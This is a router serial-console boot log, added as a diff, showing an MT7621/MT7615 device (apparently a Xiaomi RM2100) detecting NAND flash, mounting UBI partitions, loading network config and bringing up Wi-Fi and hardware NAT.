+[    3.050000] TX_CTX_IDX0 = 0
+[    3.050000] TX_DTX_IDX0 = 0
+[    3.050000] RX_CRX_IDX0 = 3ff
+[    3.050000] RX_DRX_IDX0 = 0
+[    3.060000] set_fe_HSDMA_glo_cfg
+[    3.060000] HSDMA_GLO_CFG = 465
+[    3.060000] Serial: 8250/16550 driver, 2 ports, IRQ sharing disabled
+[    3.070000] serial8250: ttyS0 at MMIO 0x1e000d00 (irq = 27) is a 16550A
+[    3.080000] serial8250: ttyS1 at MMIO 0x1e000c00 (irq = 26) is a 16550A
+[    3.090000] Ralink gpio driver initialized
+[    3.090000] brd: module loaded
+[    3.090000] MediaTek Nand driver init, version v2.1 Fix AHB virt2phys error
+[    3.100000] Allocate 16 byte aligned buffer: 81720500
+[    3.110000] Enable NFI Clock
+[    3.110000] # MTK NAND # : Use HW ECC
+[    3.110000] NAND ID [C8 D1 80 95 40, 00809540]
+[    3.120000] NAND ECC: Controller
+[    3.120000] Device found in MTK table, ID: c8d1, EXT_ID: 809540
+[    3.130000] Support this Device in MTK table! c8d1 
+
+
+[    3.130000] NAND device: Manufacturer ID: 0xc8, Chip ID: 0xd1 (ESMT NAND 128MiB 3,3V 8-bit), 128MiB, page size: 2048, OOB size: 64
+[    3.140000] [NAND]select ecc bit:4, sparesize :64 spare_per_sector=16
+[    3.150000] Scanning device for bad blocks
+[    3.300000] Signature matched and data read!
+[    3.300000] load_fact_bbt success 1023
+[    3.300000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+[    3.310000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+[    3.320000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+[    3.330000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+[    3.340000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+[    3.350000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+[    3.360000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+[    3.370000] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+[    3.380000] Creating 14 MTD partitions on "MT7621-NAND":
+[    3.390000] 0x000000000000-0x000007f80000 : "ALL"
+[    3.400000] 0x000000000000-0x000000080000 : "Bootloader"
+[    3.400000] 0x000000080000-0x0000000c0000 : "Config"
+[    3.410000] 0x0000000c0000-0x000000100000 : "Bdata"
+[    3.410000] 0x000000100000-0x000000140000 : "Factory"
+[    3.420000] 0x000000140000-0x000000180000 : "crash"
+[    3.430000] 0x000000180000-0x0000001c0000 : "crash_syslog"
+[    3.430000] 0x0000001c0000-0x000000200000 : "cfg_bak"
+[    3.440000] 0x000000200000-0x000000600000 : "kernel0"
+[    3.450000] 0x000000600000-0x000000a00000 : "kernel1"
+[    3.450000] 0x000000a00000-0x000002400000 : "rootfs0"
+[    3.460000] 0x000002400000-0x000003e00000 : "rootfs1"
+[    3.470000] 0x000003e00000-0x000006400000 : "overlay"
+[    3.470000] 0x000006400000-0x000007f80000 : "obr"
+[    3.480000] [mtk_nand] probe successfully!
+[    3.480000] tun: Universal TUN/TAP device driver, 1.6
+[    3.490000] tun: (C) 1999-2004 Max Krasnyansky <maxk@qualcomm.com>
+[    3.490000] PPP generic driver version 2.4.2
+[    3.500000] PPP BSD Compression module registered
+[    3.500000] PPP Deflate Compression module registered
+[    3.510000] PPP MPPE Compression module registered
+[    3.510000] NET: Registered protocol family 24
+[    3.520000] PPTP driver version 0.8.5
+[    3.520000] ps: can't get major 253
+[    3.530000] GMAC1_MAC_ADRH -- : 0x00008c53
+[    3.530000] GMAC1_MAC_ADRL -- : 0xc396111c
+[    3.530000] Ralink APSoC Ethernet Driver Initilization. v3.1  1024 rx/tx descriptors allocated, mtu = 1500!
+[    3.540000] GMAC1_MAC_ADRH -- : 0x00008c53
+[    3.550000] GMAC1_MAC_ADRL -- : 0xc396111c
+[    3.550000] PROC INIT OK!
+[    3.560000] softdog: Software Watchdog Timer: 0.08 initialized. soft_noboot=0 soft_margin=60 sec soft_panic=0 (nowayout=0)
+[    3.570000] Netfilter messages via NETLINK v0.30.
+[    3.570000] nfnl_acct: registering with nfnetlink.
+[    3.580000] nf_conntrack version 0.5.0 (1908 buckets, 7632 max)
+[    3.580000] gre: GRE over IPv4 demultiplexor driver
+[    3.590000] ip_tables: (C) 2000-2006 Netfilter Core Team
+[    3.590000] Type=Restricted Cone
+[    3.600000] TCP: cubic registered
+[    3.600000] NET: Registered protocol family 10
+[    3.610000] ip6_tables: (C) 2000-2006 Netfilter Core Team
+[    3.610000] NET: Registered protocol family 17
+[    3.620000] l2tp_core: L2TP core driver, V2.0
+[    3.620000] l2tp_ppp: PPPoL2TP kernel driver, V2.0
+[    3.630000] l2tp_netlink: L2TP netlink interface
+[    3.630000] 8021q: 802.1Q VLAN Support v1.8
+[    3.640000] Failed to lock mtd reserved0
+[    3.640000] MIQEF register done
+[    3.650000] Freeing unused kernel memory: 1612K (8155d000 - 816f0000)
+[    3.660000] csd: CSD deadlock debugging initiated!
+[    3.720000] Loading essential drivers...
+[    3.720000] Press Ctrl+C to enter RAMFS...
+[    4.750000] Bringup the system...
+[    4.770000] flag_boot_rootfs=0 mounting /dev/mtd10
+[    4.780000] UBI: attaching mtd10 to ubi0
+[    5.020000] UBI: scanning is finished
+[    5.040000] UBI: attached mtd10 (name "rootfs0", size 26 MiB) to ubi0
+[    5.050000] UBI: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
+[    5.050000] UBI: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
+[    5.060000] UBI: VID header offset: 2048 (aligned 2048), data offset: 4096
+[    5.070000] UBI: good PEBs: 208, bad PEBs: 0, corrupted PEBs: 0
+[    5.070000] UBI: user volume: 1, internal volumes: 1, max. volumes count: 128
+[    5.080000] UBI: max/mean erase counter: 0/0, WL threshold: 4096, image sequence number: 1677508948
+[    5.090000] UBI: available PEBs: 80, total reserved PEBs: 128, PEBs reserved for bad PEB handling: 20
+[    5.100000] UBI: background thread "ubi_bgt0d" started, PID 364
+UBI device number 0, total 208 LEBs (26411008 bytes, 25.2 MiB), available 80 LEBs (10158080 bytes, 9.7 MiB), LEB size 126976 bytes (124.0 KiB)
+config core 'version'
+	# ROM ver
+	option ROM '1.0.11'
+	# channel
+	option CHANNEL 'release'
+	# hardware platform R1AC or R1N etc.
+	option HARDWARE 'RM2100'
+	# CFE ver
+	option UBOOT '1.0.2'
+	# Linux Kernel ver
+	option LINUX '0.0.1'
+	# RAMFS ver
+	option RAMFS '0.0.1'
+	# SQUASHFS ver
+	option SQAFS '0.0.1'
+	# ROOTFS ver
+	option ROOTFS '0.0.1'
+	#build time
+	option BUILDTIME 'Mon, 25 Nov 2019 01:44:19 +0000'
+	#build timestamp
+	option BUILDTS '1574646259'
+	#build git tag
+	option GTAG 'commit 4326a2ef8777c744648440273c237ff599384b7e'
+mount: mounting proc on /proc failed: Device or resource busy
+mount: mounting sysfs on /sys failed: Device or resource busy
+[    6.350000] FFFFFF8C:53:FFFFFFC3:FFFFFF96:11:1C
+[    6.350000] Raeth v3.1 (Tasklet,SkbRecycle)
+[    6.360000] set CLK_CFG_0 = 0x40a00020!!!!!!!!!!!!!!!!!!1
+[    6.370000] phy_free_head is 0xc08000!!!
+[    6.370000] phy_free_tail_phy is 0xc09ff0!!!
+[    6.380000] txd_pool=a0c10000 phy_txd_pool=00C10000
+[    6.380000] ei_local->skb_free start address is 0x87e726dc.
+[    6.390000] free_txd: 00c10010, ei_local->cpu_ptr: 00C10000
+[    6.390000]  POOL  HEAD_PTR | DMA_PTR | CPU_PTR 
+[    6.400000] ----------------+---------+--------
+[    6.400000]      0xa0c10000 0x00C10000 0x00C10000
+[    6.410000] 
+[    6.410000] phy_qrx_ring = 0x00c0a000, qrx_ring = 0xa0c0a000
+[    6.410000] 
+[    6.410000] phy_rx_ring0 = 0x00c0c000, rx_ring0 = 0xa0c0c000
+[    6.440000] MT7530 Reset Completed!!
+[    6.450000] change HW-TRAP to 0x117c8f
+[    6.460000] set LAN/WAN WLLLL
+[    6.470000] GMAC1_MAC_ADRH -- : 0x00008c53
+[    6.470000] GMAC1_MAC_ADRL -- : 0xc396111c
+[    6.470000] GDMA2_MAC_ADRH -- : 0x00008c53
+[    6.480000] GDMA2_MAC_ADRL -- : 0xc396111b
+[    6.480000] eth1: ===> VirtualIF_open
+[    6.490000] MT7621 GE2 link rate to 1G
+[    6.490000] CDMA_CSG_CFG = 81000000
+[    6.490000] GDMA1_FWD_CFG = 20710000
+[    6.490000] GDMA2_FWD_CFG = 20710000
+- preinit -
+Mon Nov 25 01:53:32 UTC 2019
+- regular preinit -
+/lib/preinit.sh: line 1: pi_indicate_led: not found
+[    6.720000] UBI: attaching mtd12 to ubi1
+[    7.070000] UBI: scanning is finished
+[    7.090000] UBI: attached mtd12 (name "overlay", size 38 MiB) to ubi1
+[    7.090000] UBI: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
+[    7.100000] UBI: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
+[    7.110000] UBI: VID header offset: 2048 (aligned 2048), data offset: 4096
+[    7.120000] UBI: good PEBs: 304, bad PEBs: 0, corrupted PEBs: 0
+[    7.120000] UBI: user volume: 1, internal volumes: 1, max. volumes count: 128
+[    7.130000] UBI: max/mean erase counter: 3/1, WL threshold: 4096, image sequence number: 663413513
+[    7.140000] UBI: available PEBs: 0, total reserved PEBs: 304, PEBs reserved for bad PEB handling: 20
+[    7.150000] UBI: background thread "ubi_bgt1d" started, PID 573
+UBI device number 1, total 304 LEBs (38600704 bytes, 36.8 MiB), available 0 LEBs[    7.160000] UBIFS: background thread "ubifs_bgt1_0" started, PID 577
+ (0 bytes), LEB size 126976 bytes (124.0 KiB)
+[    7.230000] UBIFS: recovery needed
+[    7.420000] UBIFS: recovery completed
+[    7.430000] UBIFS: mounted UBI device 1, volume 0, name "data"
+[    7.430000] UBIFS: LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes
+[    7.440000] UBIFS: FS size: 34283520 bytes (32 MiB, 270 LEBs), journal size 1777664 bytes (1 MiB, 14 LEBs)
+[    7.450000] UBIFS: reserved for root: 1619295 bytes (1581 KiB)
+[    7.460000] UBIFS: media format: w4/r0 (latest is w4/r0), UUID 0E99381E-D5F7-4EA3-9D7A-F9056EB96483, small LPT model
+/lib/preinit.sh: line 1: jffs2_not_mounted: not found
+- init -
+[    8.600000] ra2880stop()...Done
+[    8.600000] eth1: ===> VirtualIF_close
+[    8.610000] Free TX/RX Ring Memory!
+
+init started: BusyBox v1.19.4 (2019-11-25 01:41:48 UTC)
+
+Please press Enter to activate this console. rcS S boot: INFO: rc script run time limit to 65 seconds.
+[    8.850000] MIWIFI crash syslog initialized
+[    9.750000] Mirror/redirect action on
+[    9.780000] u32 classifier
+[    9.780000]     input device check on
+[    9.780000]     Actions configured
+[    9.950000] xt_time: kernel timezone is +0800
+[   10.210000] ip_set: protocol 6
+[   10.280000] ctnetlink v0.93: registering with nfnetlink.
+[   10.300000] ipaccount: ifname [lo] event[5]
+[   10.310000] ipaccount: ifname [ifb0] event[5]
+[   10.310000] ipaccount: ifname [eth0] event[5]
+[   10.310000] ipaccount: ifname [eth1] event[5]
+[   10.370000] dev_redirect OFF.dev_redirect load success. 
+[   10.900000] <-- RTMPAllocTxRxRingMemory, Status=0, ErrorValue=0x
+[   10.910000] <-- RTMPAllocAdapterBlock, Status=0
+[   10.920000] ipaccount: ifname [wl1] event[16]
+[   10.920000] ipaccount: ifname [wl1] event[5]
+[   12.200000] 
+[   12.200000] == pAd = c1481000, size = 4194304, Status=0 ==
+[   12.210000] RTMPInitPCIeDevice():device_id=0x7615
+[   12.210000] mt_pci_chip_cfg(): HWVer=0x8a10, FWVer=0x8a10, pAd->ChipID=0x7615
+[   12.220000] mt_pci_chip_cfg(): HIF_SYS_REV=0x76150001
+[   12.230000] AP Driver version-5.0.4.0
+[   12.230000] RtmpChipOpsHook(223): Not support for HIF_MT yet! MACVersion=0x0
+[   12.240000] mt7615_init()-->
+[   12.240000] Use 1st ePAeLNA default bin.
+[   12.240000] Use 0st /etc_ro/wlan/MT7615E_EEPROM1.bin default bin.
+[   12.250000] <--mt7615_init()
+[   12.250000] <-- RTMPAllocTxRxRingMemory, Status=0
+[   12.260000] ipaccount: ifname [wl0] event[16]
+[   12.260000] ipaccount: ifname [wl0] event[5]
+[   12.500000] led=6, on=1, off=4000, blinks,=1, reset=1, time=1
+[   12.510000] led=8, on=1, off=4000, blinks,=1, reset=1, time=1
+[   12.530000] led=6, on=4000, off=1, blinks,=1, reset=1, time=1
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: INFO: loading exist /etc/config/network.
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: config interface 'loopback'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option ifname 'lo'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option proto 'static'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option ipaddr '127.0.0.1'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option netmask '255.0.0.0'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: config interface 'lan'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option ifname 'eth0'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option type 'bridge'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option proto 'static'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option ipaddr '192.168.31.1'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option netmask '255.255.255.0'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: config interface 'ifb'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option ifname 'ifb0'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: config interface 'ready'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option proto 'static'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option ipaddr '169.254.29.1'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option netmask '255.255.255.0'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: config interface 'wan'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option proto 'dhcp'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: list dns '1.1.1.1'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: list dns '8.8.4.4'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option mtu '1500'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option peerdns '0'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option ifname 'eth1'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: config interface 'openvpn'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option ifname 'tun0'
+Mon Nov 25 09:53:38 CST 2019 netconfig[903]: option proto 'openvpn'
+[   20.890000] ipaccount: ifname [br-lan] event[16]
+[   20.900000] ipaccount: ifname [br-lan] event[5]
+[   20.900000] ipaccount: ifname [eth0] event[13]
+[   20.910000] FFFFFF8C:53:FFFFFFC3:FFFFFF96:11:1C
+[   20.910000] Raeth v3.1 (Tasklet,SkbRecycle)
+[   20.920000] set CLK_CFG_0 = 0x40a00020!!!!!!!!!!!!!!!!!!1
+[   20.930000] phy_free_head is 0xc2c000!!!
+[   20.930000] phy_free_tail_phy is 0xc2dff0!!!
+[   20.940000] txd_pool=a0c30000 phy_txd_pool=00C30000
+[   20.940000] ei_local->skb_free start address is 0x87e726dc.
+[   20.950000] free_txd: 00c30010, ei_local->cpu_ptr: 00C30000
+[   20.950000]  POOL  HEAD_PTR | DMA_PTR | CPU_PTR 
+[   20.960000] ----------------+---------+--------
+[   20.960000]      0xa0c30000 0x00C30000 0x00C30000
+[   20.970000] 
+[   20.970000] phy_qrx_ring = 0x00c2e000, qrx_ring = 0xa0c2e000
+[   20.980000] 
+[   20.980000] phy_rx_ring0 = 0x00c38000, rx_ring0 = 0xa0c38000
+[   21.010000] MT7530 Reset Completed!!
+[   21.010000] change HW-TRAP to 0x117c8f
+[   21.020000] set LAN/WAN WLLLL
+[   21.030000] GMAC1_MAC_ADRH -- : 0x00008c53
+[   21.030000] GMAC1_MAC_ADRL -- : 0xc396111c
+[   21.040000] eth1: ===> VirtualIF_open
+[   21.040000] MT7621 GE2 link rate to 1G
+[   21.040000] CDMA_CSG_CFG = 81000000
+[   21.040000] GDMA1_FWD_CFG = 20710000
+[   21.040000] GDMA2_FWD_CFG = 20710000
+[   21.040000] ipaccount: ifname [eth0] event[1]
+[   21.040000] ipaccount: ifname [eth0] event[20]
+[   21.040000] device eth0 entered promiscuous mode
+[   21.040000] ipaccount: ifname [br-lan] event[11]
+[   21.040000] ipaccount: ifname [br-lan] event[8]
+[   21.040000] ipaccount: ifname [br-lan] event[8]
+[   21.040000] ipaccount: ifname [br-lan] event[13]
+[   21.040000] br-lan: port 1(eth0) entered forwarding state
+[   21.040000] br-lan: port 1(eth0) entered forwarding state
+[   21.040000] ipaccount: ifname [br-lan] event[1]
+[   21.110000] ipaccount: ifname [ifb0] event[13]
+[   21.110000] ipaccount: ifname [ifb0] event[1]
+[   21.120000] ipaccount: ifname [lo] event[13]
+[   21.120000] ipaccount: ifname [lo] event[1]
+[   21.130000] ipaccount: ifname [eth1] event[13]
+[   21.130000] eth1: ===> VirtualIF_open
+[   21.140000] ipaccount: ifname [eth1] event[1]
+[   21.900000] ipaccount: ifname [br-lan] event[4]
+[   21.920000] ipaccount: ifname [wl1] event[13]
+[   21.920000] pAd->ApBootFlag = TRUE
+[   22.120000] efuse_probe: efuse = 10000002
+[   22.290000] tssi_1_target_pwr_g_band = 12
+[   23.040000] br-lan: port 1(eth0) entered forwarding state
+[   24.310000] ESW: Link Status Changed - Port0 Link UP,1000Mbps,Full Duplex
+[   25.060000] <==== rt28xx_init, Status=0
+[   25.060000] ipaccount: ifname [wl2] event[16]
+[   25.070000] ipaccount: ifname [wl2] event[5]
+[   25.070000] ipaccount: ifname [wl3] event[16]
+[   25.080000] ipaccount: ifname [wl3] event[5]
+[   25.080000] ipaccount: ifname [apcli0] event[16]
+[   25.090000] ipaccount: ifname [apcli0] event[5]
+[   25.090000] pAd->ApBootFlag = FALSE
+[   25.100000] ipaccount: ifname [wl1] event[1]
+[   26.390000] ipaccount: ifname [wl1] event[20]
+[   26.390000] device wl1 entered promiscuous mode
+[   26.400000] br-lan: port 2(wl1) entered forwarding state
+[   26.400000] br-lan: port 2(wl1) entered forwarding state
+[   26.440000] ipaccount: ifname [wl2] event[13]
+[   26.440000] ##### mbss_cr_enable, BssId = 1
+[   26.450000] ipaccount: ifname [wl2] event[1]
+[   27.310000] dev_redirect: add(+) dev redirect mapping: src:eth1->dst:ifb0
+[   27.600000] ipaccount: ifname [wl0] event[13]
+[   27.610000] wl0: ===> main_virtual_if_open
+[   27.930000] E2pAccessMode=2
+[   27.930000] SSID[0]=dolf2, EdcaIdx=0
+[   27.940000] DBDC Mode=0, eDBDC_mode = 0
+[   27.940000] BSS0 PhyMode=49
+[   27.940000] wmode_band_equal(): Band Equal!
+[   27.950000] [TxPower] BAND0: 100 
+[   27.960000] [PERCENTAGEenable] BAND0: 1 
+[   27.960000] FragThreshold[0]=2346
+[   27.970000] [RTMPSetProfileParameters]Disable DFS/Zero wait=0/0
+[   28.020000] HT: WDEV[0] Ext Channel = ABOVE
+[   28.020000] HT: greenap_cap = 0
+[   28.050000] WtcSetMaxStaNum: BssidNum:1, MaxStaNum:124 (WdsNum:0, ApcliNum:2, MaxNumChipRept:32), MinMcastWcid:125
+[   28.060000] Top Init Done!
+[   28.070000] Use dev_alloc_skb
+[   28.070000] RX[0] DESC a0c28000 size = 16384
+[   28.080000] RX[1] DESC a0c26000 size = 8192
+[   28.080000] cut_through_init(): ct sw token number = 4095
+[   28.090000] cut_through_token_list_init(): TokenList inited done!id_head/tail=0/4096
+[   28.090000] cut_through_token_list_init(): 850c2c08,850c2c08
+[   28.100000] cut_through_token_list_init(): TokenList inited done!id_head/tail=0/4096
+[   28.110000] cut_through_token_list_init(): 850c2c18,850c2c18
+[   28.110000] Hif Init Done!
+[   28.120000] ctl->txq = c187b76c
+[   28.120000] ctl->rxq = c187b778
+[   28.120000] ctl->ackq = c187b784
+[   28.130000] ctl->kickq = c187b790
+[   28.130000] ctl->tx_doneq = c187b79c
+[   28.130000] ctl->rx_doneq = c187b7a8
+[   28.140000] Parsing patch header
+[   28.140000] 	Built date: 20180518100604a
+[   28.140000] 
+[   28.150000] 	Platform: ALPS
+[   28.150000] 	HW/SW version: 0x8a108a10
+[   28.150000] 	Patch version: 0x00000010
+[   28.160000] 	Target address: 0x80000, length: 11072
+[   28.160000] patch is not ready && get semaphore success
+[   28.170000] EventGenericEventHandler: CMD Success
+[   28.170000] MtCmdPatchFinishReq
+[   28.190000] EventGenericEventHandler: CMD Success
+[   28.190000] release patch semaphore
+[   28.190000] Parsing CPU 0 fw tailer
+[   28.200000] 	Chip ID: 0x04
+[   28.200000] 	Eco version: 0x00
+[   28.200000] 	Region number: 0x00
+[   28.210000] 	Format version: 0x00
+[   28.210000] 	Ram version: _reserved_
+[   28.210000] 	Built date: 20190307015603\00
+[   28.220000] 	Common crc: 0x0
+[   28.220000] Parsing tailer region 0
+[   28.220000] 	Feature set: 0x01
+[   28.230000] 	Target address: 0x84000, Download size: 409600
+[   28.230000] Parsing tailer region 1
+[   28.240000] 	Feature set: 0x01
+[   28.240000] 	Target address: 0x209c400, Download size: 43328
+[   28.240000] EventGenericEventHandler: CMD Success
+[   28.260000] EventGenericEventHandler: CMD Success
+[   28.260000] MtCmdFwStartReq: override = 0x1, address = 0x84000
+[   28.270000] EventGenericEventHandler: CMD Success
+[   28.270000] Parsing CPU 1 fw tailer
+[   28.270000] 	Chip ID: 0x04
+[   28.280000] 	Eco version: 0x00
+[   28.280000] 	Region number: 0x00
+[   28.280000] 	Format version: 0x00
+[   28.290000] 	Ram version: _reserved_
+[   28.290000] 	Built date: 20190415154149\00
+[   28.290000] 	Common crc: 0x0
+[   28.300000] Parsing tailer region 0
+[   28.300000] 	Feature set: 0x01
+[   28.300000] 	Target address: 0x90000000, Download size: 122608
+[   28.310000] EventGenericEventHandler: CMD Success
+[   28.320000] MtCmdFwStartReq: override = 0x4, address = 0x0
+[   28.360000] EventGenericEventHandler: CMD Success
+[   28.400000] br-lan: port 2(wl1) entered forwarding state
+[   28.430000] MCU Init Done!
+[   28.430000] efuse_probe: efuse = 10000212
+[   28.430000] RtmpChipOpsEepromHook::e2p_type=2, inf_Type=5
+[   28.440000] RtmpEepromGetDefault::e2p_dafault=1
+[   28.440000] RtmpChipOpsEepromHook: E2P type(2), E2pAccessMode = 2, E2P default = 1
+[   28.450000] NVM is FLASH mode. dev_idx [1] FLASH OFFSET [0x8000]
+[   28.460000] [34mNICReadEEPROMParameters: EEPROM 0x52 b300[m
+[   35.940000] Country Region from e2p = 101
+[   35.940000] MtCmdSetDbdcCtrl:(ret = 0)
+[   35.950000] MtSingleSkuLoadParam: RF_LOCKDOWN Feature OFF !!!
+[   35.950000] MtBfBackOffLoadParam: RF_LOCKDOWN Feature OFF !!!
+[   35.960000] EEPROM Init Done!
+[   35.960000] mt_mac_init()-->
+[   35.970000] mt7615_init_mac_cr()-->
+[   35.970000] mt7615_init_mac_cr(): TMAC_TRCR0=0x82783c8c
+[   35.980000] mt7615_init_mac_cr(): TMAC_TRCR1=0x82783c8c
+[   35.980000] <--mt_mac_init()
+[   35.980000] MAC Init Done!
+[   35.990000] MT7615BBPInit():BBP Initialization.....
+[   35.990000] 	Band 0: valid=1, isDBDC=0, Band=2, CBW=1, CentCh/PrimCh=1/1, prim_ch_idx=0, txStream=2
+[   36.000000] 	Band 1: valid=0, isDBDC=0, Band=0, CBW=0, CentCh/PrimCh=0/0, prim_ch_idx=0, txStream=0
+[   36.010000] PHY Init Done!
+[   36.010000] MtCmdSetMacTxRx:(ret = 0)
+[   36.020000] WifiFwdSet::disabled=0
+[   36.020000] Main bssid = 00:00:00:00:00:00
+[   36.030000] MtCmdSetMacTxRx:(ret = 0)
+[   36.030000] MtCmdSetMacTxRx:(ret = 0)
+[   36.030000] <==== mt_wifi_init, Status=0
+[   36.040000] TxBfModuleEnCtrl:It's not DBDC mode
+[   36.040000] MtCmdEDCCACtrl: BandIdx: 0, EDCCACtrl: 1
+[   36.050000] MtCmdEDCCACtrl: BandIdx: 1, EDCCACtrl: 1
+[   36.050000] ipaccount: ifname [apclii0] event[16]
+[   36.060000] ipaccount: ifname [apclii0] event[5]
+[   36.060000] WtcSetMaxStaNum: BssidNum:1, MaxStaNum:124 (WdsNum:0, ApcliNum:2, MaxNumChipRept:32), MinMcastWcid:125
+[   36.110000] RTMP_COM_IoctlHandle -> CMD_RTPRIV_IOCTL_VIRTUAL_INF_UP
+[   36.120000] wifi_sys_open(), wdev idx = 0
+[   36.120000] wdev_attr_update(): wdevId0 = 8c:53:c3:96:11:1e
+[   36.130000] [RcGetHdevByPhyMode]-- channel 0 fix for rdev fetching
+[   36.130000] MtCmdSetDbdcCtrl:(ret = 0)
+[   36.140000] [1;33m [RadarStateCheck] RD_NORMAL_MODE [m 
+[   36.140000] AP inf up for ra_0(func_idx) OmacIdx=0
+[   36.150000] AsicRadioOnOffCtrl(): DbdcIdx=0 RadioOn
+[   36.150000] ApAutoChannelAtBootUp----------------->
+[   36.160000] ApAutoChannelAtBootUp: AutoChannelBootup = 1
+[   36.160000] MtCmdSetMacTxRx:(ret = 0)
+[   36.170000] [AutoChSelBuildChannelListFor5G] ChListNum5G = 13
+[   36.980000] ApAutoChannelAtBootUp : Auto channel selection: Selected channel = 157, IsAband = 1
+[   36.980000] [41m AutoChSelUpdateChannel(): Update channel for wdev for this band PhyMode = 49, Channel = 157 [m
+[   36.990000] [1;33m [RadarStateCheck] RD_NORMAL_MODE [m 
+[   38.110000] :MtCmdPktBudgetCtrl: bssid(255),wcid(65535),type(0)
+[   38.110000] [DfsCacNormalStart] Normal start. Enable MAC TX
+[   38.110000] ApAutoChannelAtBootUp<-----------------
+[   38.110000] wifi_sys_linkup(), wdev idx = 0
+[   38.240000] bssUpdateBmcMngRate (BSS_INFO_BROADCAST_INFO), CmdBssInfoBmcRate.u2BcTransmit= 8192, CmdBssInfoBmcRate.u2McTransmit = 8196
+[   38.250000] UpdateBeaconHandler, BCN_UPDATE_INIT, OmacIdx = 0
+[   38.260000] APStartUpForMbss: BssIndex = 0 channel = 157
+[   38.260000] MtCmdTxPowerDropCtrl: ucPowerDrop: 100, BandIdx: 0
+[   38.270000] apidx 0 for WscUUIDInit
+[   38.270000] Generate UUID for apidx(0)
+[   38.280000] ipaccount: ifname [wl0] event[1]
+[   38.320000] wifi_sys_linkdown(), wdev idx = 0
+[   38.320000] ExtEventBeaconLostHandler::FW LOG, Beacon lost (8c:53:c3:96:11:1e), Reason 0x10
+[   38.320000]   Beacon lost - AP disabled!!!
+[   38.340000] bssUpdateBmcMngRate (BSS_INFO_BROADCAST_INFO), CmdBssInfoBmcRate.u2BcTransmit= 0, CmdBssInfoBmcRate.u2McTransmit = 0
+[   38.350000] wifi_sys_close(), wdev idx = 0
+[   38.350000] wifi_sys_open(), wdev idx = 0
+[   38.360000] wdev_attr_update(): wdevId0 = 8c:53:c3:96:11:1e
+[   38.360000] MtCmdSetDbdcCtrl:(ret = 0)
+[   38.370000] [DfsCacNormalStart] Normal start. Enable MAC TX
+[   38.370000] wifi_sys_linkup(), wdev idx = 0
+[   38.520000] bssUpdateBmcMngRate (BSS_INFO_BROADCAST_INFO), CmdBssInfoBmcRate.u2BcTransmit= 8192, CmdBssInfoBmcRate.u2McTransmit = 8196
+[   38.540000] UpdateBeaconHandler, BCN_UPDATE_INIT, OmacIdx = 0
+[   39.260000] ipaccount: ifname [wl0] event[20]
+[   39.260000] device wl0 entered promiscuous mode
+[   39.270000] br-lan: port 3(wl0) entered forwarding state
+[   39.270000] br-lan: port 3(wl0) entered forwarding state
+[   39.290000] Device Instance
+[   39.300000] 	WDEV 00:, Name:wl0, Wdev(list) Idx:0
+[   39.300000] 		 Idx:6
+[   39.300000] 	WDEV 01:, Name:apclii0, Wdev(list) Idx:1
+[   39.310000] 		 Idx:11
+[   39.310000] 
+[   39.310000] 
+[   39.310000] 
+[   39.320000] 
+[   39.320000] 
+[   39.320000] 
+[   39.320000] 
+[   39.320000] 
+[   39.320000] 
+[   39.330000] 
+[   39.330000] 
+[   39.330000] 
+[   39.330000] 
+[   39.330000] 
+[   39.330000] 
+[   39.330000] 
+[   39.830000] enable ip account module.
+rcS S calling: /etc/rc.d/S20network boot: WARNING: EXITCODE=0, execute too slow, 20 >= 15: /etc/rc.d/S20network boot
+[   41.270000] br-lan: port 3(wl0) entered forwarding state
+[   41.490000] dev_redirect: add(+) dev redirect mapping: src:eth1->dst:ifb0
+[   44.030000] Ralink HW NAT Module Enabled
+[   44.040000] eth0 ifindex =3
+[   44.040000] eth1 ifindex =4
+[   44.040000] HNAT: switch HNAT ON.....
